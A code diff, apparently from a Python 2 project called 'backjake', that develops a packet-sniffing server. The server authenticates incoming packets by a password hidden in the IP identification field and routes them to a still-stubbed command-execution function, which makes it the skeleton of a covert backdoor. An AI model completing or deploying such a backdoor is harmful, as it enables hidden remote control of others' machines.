@@ -7,10 +7,6 @@ import config
 import backjake
 import utils
 
-def endProgram():
-	print "endProgram"
-
-
 def recieveDatagram():
 	cap = pcapy.open_live(config.dev, 65536, 1, 0)
 	cap.setfilter(config.protocol)
@@ -23,16 +19,11 @@ def startServer():
 	listenThread = threading.Thread(target=recieveDatagram)
 	listenThread.daemon = True
 	listenThread.start()
-	print "Listen thread start!"
 
 def packetHandler(packet):
 	if (authenticated(packet)):
-		proto = checkType(packet)
-		ip, protoH, data = stripPacket(packet, proto)
-
-		# run command
-	# else
-		# attempt to authenticate
+		ip, protoH, data = stripPacket(packet, checkType(packet))
+		executeCommand(ip, protoH, data)
 
 def stripPacket(packet, proto):
 	ipLength = 20
@@ -85,10 +76,6 @@ def authenticated(packet):
  	if ipIdent == utils.encrypt(config.password):
  		print "auth!"
 
-def executeCommand():
+def executeCommand(ip, proto, data):
 	print "executeCommand"
-
-
-def endProgram():
-	print "endProgram"
 
